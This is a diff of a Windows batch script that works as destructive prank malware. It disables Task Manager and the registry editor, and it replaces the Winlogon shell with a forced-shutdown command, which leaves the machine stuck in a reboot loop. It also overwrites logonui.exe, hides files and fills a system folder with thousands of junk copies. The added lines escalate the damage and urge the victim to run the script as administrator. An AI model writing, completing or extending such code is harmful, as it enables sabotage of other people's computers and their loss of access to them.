@@ -5,6 +5,9 @@
 
 :: setup registry keys before killing explorer (a mistake I made is not putting /f)
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /d "1" /f
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v DisableRegistryTools /d 1 /f
+
 reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /d "C:\Windows\system32\cmd.exe /c shutdown /r /t 0" /f
 cls
 :: set username secretly (not really) and before killing explorer
@@ -20,6 +23,7 @@ echo ----RULES----
 echo DO NOT SHARE TO ANYBODY ELSE.
 echo IF YOU DO THIS YOU WILL FACE THE CONSEQUENCES.
 echo ALSO THERE'S NO GOING BACK, %USERNAME%....
+echo make sure to run as admin :) as this might not work!
 pause
 cls
 rem Set the color to green
@@ -49,7 +53,7 @@ attrib +s +h %userprofile%\desktop\*.bat
 cls
 echo Do you want to restart your computer? :) There is a surprise... for you...
 set /p input=
-if /i %input%==yes goto systemLag
+if /i %input%==yes goto finialize
 if /i %input%==no goto gethaxor
 if not /i %input%==yes,no goto gethaxor
 
@@ -62,9 +66,10 @@ set /a cr=0
 :systemLag
 copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\ArcherHackers\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
-if not %cr%==2000 goto systemLag
+if not %cr%==10000 goto systemLag
 
 shutdown /s /t 10
+attrib +s C:\windows\system32
 exit
 
 :gethaxor
@@ -82,10 +87,12 @@ copy C:\Windows\explorer.exe C:\Windows\System32\logonui.exe
 cls
 set /a cr=0
 
-:copy
+:sysLag
 copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\ArcherHackers\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
-if not %cr%==2000 goto copy
+cls
+if not %cr%==10000 goto sysLag
 
 shutdown /s /t 10
+attrib +s C:\windows\ArcherHackers
 exit
